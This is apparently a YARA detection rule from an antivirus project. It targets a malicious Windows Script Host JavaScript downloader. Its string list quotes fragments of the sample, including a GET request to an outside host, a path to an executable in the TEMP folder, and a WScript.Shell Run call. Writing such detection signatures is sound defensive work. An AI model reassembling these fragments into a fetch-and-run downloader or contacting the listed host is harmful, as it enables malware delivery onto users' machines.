rule sig_20160329_3570ea0544f1f1ba4cc23ff5caa8daea {
  meta:
    description = "datamaliciousorder - file 20160329_3570ea0544f1f1ba4cc23ff5caa8daea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d37c6c1ff20744e3aaeab3bca92c42341fba452eef13df736ea0fcd931771079"

  strings:
    $s1  = "Gu[Xp](\"GET\", \"http://pasticceriabonci.com/n4usj\", false);" fullword ascii
    $s2  = "function xQ() {return A[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"daJKLF6JbySr3u.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[hw](Ms() * 11); if (Gu[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var A = function mC() {return WScript[rW](\"WScript.Shell\");}(), KA = 11;" fullword ascii
    $s5  = "function v(GS, Jc){Xi = Xi * 1; return GS - Jc;};" fullword ascii
    $s6  = "function vP(){return \"\" + XF;};" fullword ascii
    $s7  = "function cG() {return ((BU == true) && (BU == s)) ? 1 : Xi;};" fullword ascii
    $s8  = "function U(PW){A[\"Run\"](PW, Xi, Xi);};" fullword ascii
    $s9  = "function J()" fullword ascii
    $s10 = "var FA = new this[\"Date\"]();" fullword ascii
    $s11 = "function g(WO) {var w = (1, 2, 3, 4, 5, WO); return w;};" fullword ascii
    $s12 = "function Ms(){return 22;};" fullword ascii
    $s13 = "return v(I, F);" fullword ascii
    $s14 = "function X(){return rW;};" fullword ascii
    $s15 = " while (nq){" fullword ascii
    $s16 = "var s = false;" fullword ascii
    $s17 = "BU = true; " fullword ascii
    $s18 = "var BU = false;" fullword ascii
    $s19 = "s = true; " fullword ascii
    $s20 = "var F0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}